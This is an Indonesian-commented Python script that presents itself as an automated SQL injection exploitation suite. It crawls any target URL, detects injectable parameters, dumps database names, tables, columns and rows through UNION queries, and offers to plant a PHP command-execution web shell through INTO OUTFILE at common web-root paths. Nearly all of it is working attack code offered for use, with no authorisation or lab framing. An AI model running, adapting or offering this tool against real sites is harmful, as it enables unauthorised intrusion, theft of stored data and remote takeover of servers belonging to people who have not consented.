#!/usr/bin/env python3
# MAI - SQL Injection Auto Exploitation Suite
# Author: fanky
# Version: 3.1 (2026) - Stable Release

import sys
import re
import time
import random
import urllib.parse
from html.parser import HTMLParser
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import OrderedDict

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# ==================== KONFIGURASI ====================
TIMEOUT = 15
DELAY = 0.3
MAX_THREADS = 5
MAX_COLUMNS = 30

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
]

COLOR = {
    'INFO': '\033[92m',
    'ERROR': '\033[91m',
    'SUCCESS': '\033[94m',
    'WARNING': '\033[93m',
    'DEBUG': '\033[96m',
    'RESET': '\033[0m',
    'BOLD': '\033[1m'
}

def info(msg):  print(f"{COLOR['INFO']}[INFO]{COLOR['RESET']} {msg}")
def error(msg): print(f"{COLOR['ERROR']}[ERROR]{COLOR['RESET']} {msg}")
def success(msg): print(f"{COLOR['SUCCESS']}[SUCCESS]{COLOR['RESET']} {msg}")
def warning(msg): print(f"{COLOR['WARNING']}[WARNING]{COLOR['RESET']} {msg}")
def debug(msg): print(f"{COLOR['DEBUG']}[DEBUG]{COLOR['RESET']} {msg}")

def banner():
    print(f"{COLOR['BOLD']}{COLOR['DEBUG']}")
    print("  ╔══════════════════════════════════════════════════════════════════╗")
    print("  ║            MAI - SQL Injection Auto Exploitation Suite           ║")
    print("  ║                         Author: fanky                            ║")
    print("  ║                      Professional Edition 2026                    ║")
    print("  ║          Features: Auto crawl | Union | Blind | Shell            ║")
    print("  ╚══════════════════════════════════════════════════════════════════╝")
    print(COLOR['RESET'])

# ==================== HTTP SESSION ====================
session = requests.Session()
session.verify = False
session.headers.update({'User-Agent': random.choice(USER_AGENTS)})

def fetch(url, params=None, post_data=None):
    time.sleep(DELAY)
    try:
        if params:
            return session.get(url, params=params, timeout=TIMEOUT)
        elif post_data:
            return session.post(url, data=post_data, timeout=TIMEOUT)
        else:
            return session.get(url, timeout=TIMEOUT)
    except Exception as e:
        debug(f"Request error: {str(e)[:60]}")
        return None

# ==================== CRAWLER ====================
class FormExtractor(HTMLParser):
    def __init__(self, base_url):
        super().__init__()
        self.base_url = base_url
        self.links = []
        self.forms = []
    def handle_starttag(self, tag, attrs):
        attrs = dict(attrs)
        if tag == 'a' and 'href' in attrs:
            href = attrs['href']
            if '?' in href:
                full = urllib.parse.urljoin(self.base_url, href)
                self.links.append(full)
        elif tag == 'form':
            action = attrs.get('action', '')
            method = attrs.get('method', 'get').lower()
            full_action = urllib.parse.urljoin(self.base_url, action)
            self.forms.append((full_action, method, []))
        elif tag == 'input' and self.forms:
            name = attrs.get('name')
            if name:
                self.forms[-1][2].append(name)

def extract_params(url):
    parsed = urllib.parse.urlparse(url)
    if parsed.query:
        return {k: v[0] for k, v in urllib.parse.parse_qs(parsed.query).items()}
    return {}

def discover_endpoints(target):
    info(f"Crawling {target} ...")
    resp = fetch(target)
    if not resp or resp.status_code != 200:
        error("Gagal mengakses halaman utama")
        return [], []
    parser = FormExtractor(target)
    parser.feed(resp.text)
    unique_links = list(OrderedDict.fromkeys(parser.links))
    get_endpoints = []
    for link in unique_links:
        params = extract_params(link)
        if params:
            get_endpoints.append((link, params))
    info(f"Ditemukan {len(get_endpoints)} endpoint GET")
    return get_endpoints, parser.forms

# ==================== INJECTION DETECTION ====================
def test_injection(url, param, orig_val, orig_content):
    # payload list: (payload, description)
    payloads = [
        ("'", "single quote"),
        ("\"", "double quote"),
        ("' OR '1'='1", "or injection"),
        (" AND 1=2", "numeric")
    ]
    for payload, desc in payloads:
        test_val = f"{orig_val}{payload}"
        resp = fetch(url, params={param: test_val})
        if resp and resp.status_code == 200:
            # cek error SQL
            err_keywords = ["mysql_fetch", "SQL syntax", "You have an error", "Unclosed quotation", "ORA-", "PostgreSQL"]
            if any(k.lower() in resp.text.lower() for k in err_keywords):
                success(f"Error based injection on {param} ({desc})")
                return "error", payload
            # cek perubahan konten
            if resp.text != orig_content:
                success(f"Union/Boolean based injection on {param} ({desc})")
                return "union", payload
    # boolean blind test
    true_payload = f"{orig_val}' AND '1'='1"
    false_payload = f"{orig_val}' AND '1'='2"
    r1 = fetch(url, params={param: true_payload})
    r2 = fetch(url, params={param: false_payload})
    if r1 and r2 and r1.text != r2.text:
        success(f"Boolean blind injection on {param}")
        return "boolean", "' AND '1'='1"
    return None, None

# ==================== COLUMN COUNT ====================
def count_columns(url, param, orig_val, inj_type, trigger):
    for cols in range(1, MAX_COLUMNS+1):
        payload = f"{orig_val}{trigger} ORDER BY {cols}-- -"
        resp = fetch(url, params={param: payload})
        if not resp:
            continue
        if "Unknown column" in resp.text or "error" in resp.text.lower():
            return cols-1
    return MAX_COLUMNS

# ==================== UNION EXTRACTION ====================
def union_extract(url, param, orig_val, trigger, num_cols):
    markers = ','.join([str(i*11) for i in range(1, num_cols+1)])
    payload = f"{orig_val}{trigger} UNION SELECT {markers}-- -"
    resp = fetch(url, params={param: payload})
    if resp and resp.status_code == 200:
        visible = [m for m in markers.split(',') if m in resp.text]
        if visible:
            success(f"Visible columns: {', '.join(visible)}")
            return resp.text
    return None

def dump_database(url, param, orig_val, trigger, num_cols):
    # Build NULL list, place database() at column 1 (index 1)
    nulls = ['NULL'] * num_cols
    nulls[1] = "database()"
    payload = f"{orig_val}{trigger} UNION SELECT {','.join(nulls)}-- -"
    resp = fetch(url, params={param: payload})
    if resp:
        match = re.search(r'([a-zA-Z0-9_\-]{3,30})', resp.text)
        if match:
            db = match.group(1)
            success(f"Database: {db}")
            return db
    return None

def dump_tables(url, param, orig_val, trigger, num_cols, db_name):
    nulls = ['NULL'] * num_cols
    nulls[1] = "table_name"
    payload = f"{orig_val}{trigger} UNION SELECT {','.join(nulls)} FROM information_schema.tables WHERE table_schema='{db_name}'-- -"
    resp = fetch(url, params={param: payload})
    if resp:
        tables = re.findall(r'([a-zA-Z0-9_]{2,40})', resp.text)
        if tables:
            unique = list(OrderedDict.fromkeys(tables))
            success(f"Tables: {', '.join(unique[:10])}")
            return unique
    return []

def dump_columns(url, param, orig_val, trigger, num_cols, db_name, table_name):
    nulls = ['NULL'] * num_cols
    nulls[1] = "column_name"
    payload = f"{orig_val}{trigger} UNION SELECT {','.join(nulls)} FROM information_schema.columns WHERE table_schema='{db_name}' AND table_name='{table_name}'-- -"
    resp = fetch(url, params={param: payload})
    if resp:
        cols = re.findall(r'([a-zA-Z0-9_]{2,40})', resp.text)
        if cols:
            unique = list(OrderedDict.fromkeys(cols))
            success(f"Columns: {', '.join(unique[:10])}")
            return unique
    return []

def dump_data(url, param, orig_val, trigger, num_cols, db_name, table_name, column_name):
    info(f"Extracting data from {table_name}.{column_name} (limit 10)")
    nulls = ['NULL'] * num_cols
    nulls[1] = column_name
    payload = f"{orig_val}{trigger} UNION SELECT {','.join(nulls)} FROM {db_name}.{table_name} LIMIT 10-- -"
    resp = fetch(url, params={param: payload})
    if resp:
        # ambil teks antar tag (simple)
        data = re.findall(r'>([^<]{2,200})<', resp.text)
        data = [d.strip() for d in data if d.strip() and len(d.strip()) > 2]
        if data:
            for i, val in enumerate(data[:10]):
                success(f"Row {i+1}: {val[:100]}")
            return data
    return None

# ==================== WEBSHELL UPLOAD ====================
def upload_shell(url, param, orig_val, trigger, num_cols):
    warning("Mencoba upload webshell via INTO OUTFILE...")
    shell = "<?php if(isset($_REQUEST['cmd'])){system($_REQUEST['cmd']);}?>"
    paths = [
        "/var/www/html/shell.php",
        "/var/www/shell.php",
        "/home/public_html/shell.php",
        "/tmp/shell.php",
        "C:/xampp/htdocs/shell.php"
    ]
    for path in paths:
        nulls = ['NULL'] * num_cols
        nulls[0] = f"'{shell}'"
        payload = f"{orig_val}{trigger} UNION SELECT {','.join(nulls)} INTO OUTFILE '{path}'-- -"
        resp = fetch(url, params={param: payload})
        if resp and "error" not in resp.text.lower():
            success(f"Webshell uploaded to {path}")
            warning(f"Access: {path}?cmd=id")
            return True
    error("Gagal upload shell (periksa privilege FILE)")
    return False

# ==================== MAIN SCAN LOGIC ====================
def scan_endpoint(url, params_dict):
    for param, orig_val in params_dict.items():
        info(f"Testing parameter: {param} = {orig_val}")
        orig_resp = fetch(url)
        if not orig_resp:
            continue
        inj_type, trigger = test_injection(url, param, orig_val, orig_resp.text)
        if not inj_type:
            continue
        success(f"VULNERABLE! {param} ({inj_type} based)")
        cols = count_columns(url, param, orig_val, inj_type, trigger)
        info(f"Columns: {cols}")
        if cols >= 2:
            union_extract(url, param, orig_val, trigger, cols)
            db = dump_database(url, param, orig_val, trigger, cols)
            if db and db != "DOCTYPE" and db not in ["html", "head", "body"]:
                tables = dump_tables(url, param, orig_val, trigger, cols, db)
                if tables:
                    table = tables[0]
                    cols_list = dump_columns(url, param, orig_val, trigger, cols, db, table)
                    if cols_list:
                        dump_data(url, param, orig_val, trigger, cols, db, table, cols_list[0])
            # tanya upload shell
            print(f"{COLOR['WARNING']}Upload shell? (y/n): {COLOR['RESET']}", end='')
            choice = sys.stdin.readline().strip().lower()
            if choice == 'y':
                upload_shell(url, param, orig_val, trigger, cols)
        break  # cukup satu parameter rentan per URL

def main():
    banner()
    target = input(f"{COLOR['BOLD']}{COLOR['WARNING']}URL target > {COLOR['RESET']}").strip()
    if not target:
        error("URL tidak boleh kosong")
        sys.exit(1)
    if not target.startswith(('http://','https://')):
        target = 'http://' + target
    get_endpoints, post_forms = discover_endpoints(target)
    if not get_endpoints and not post_forms:
        error("Tidak ada endpoint dengan parameter. Coba URL lain.")
        sys.exit(1)
    info(f"Memulai scan pada {len(get_endpoints)} endpoint GET")
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as ex:
        futures = [ex.submit(scan_endpoint, url, params) for url, params in get_endpoints]
        for f in as_completed(futures):
            try:
                f.result()
            except Exception as e:
                debug(f"Thread error: {e}")
    # scan POST forms sederhana
    for action, method, inputs in post_forms:
        if method == 'post' and inputs:
            info(f"Testing POST form: {action}")
            for field in inputs[:2]:
                test_data = {field: "'"}
                resp = fetch(action, post_data=test_data)
                if resp and ("mysql" in resp.text.lower() or "error" in resp.text.lower()):
                    success(f"POST injection possible on {field} at {action}")
    success("Scan selesai.")

if __name__ == "__main__":
    main()
